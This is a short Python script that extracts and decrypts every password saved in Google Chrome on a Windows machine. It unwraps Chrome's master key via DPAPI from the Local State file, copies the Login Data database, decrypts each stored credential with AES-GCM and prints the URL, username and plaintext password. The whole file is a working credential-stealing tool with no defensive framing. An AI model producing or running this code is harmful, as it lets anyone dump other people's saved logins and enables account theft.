import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES

# Get master key from Local State file
def get_master_key():
    local_state_path = os.path.expanduser(
        r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

# Decrypt the AES-encrypted Chrome password
def decrypt_password(buff, master_key):
    try:
        if buff[:3] == b'v10':  # Chrome prefix
            iv = buff[3:15]
            ciphertext = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(ciphertext, tag).decode()
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"Error: {e}"

def get_chrome_passwords():
    # Path to Chrome database
    chrome_db = os.path.expanduser(
        r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    )

    # Copy file to avoid locking
    shutil.copy2(chrome_db, "ChromeTemp.db")

    conn = sqlite3.connect("ChromeTemp.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    master_key = get_master_key()

    print("\nSaved Chrome passwords:\n")
    for url, username, encrypted_password in cursor.fetchall():
        if username or encrypted_password:
            password = decrypt_password(encrypted_password, master_key)
            print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n")

    conn.close()
    os.remove("ChromeTemp.db")

if __name__ == "__main__":
    get_chrome_passwords()
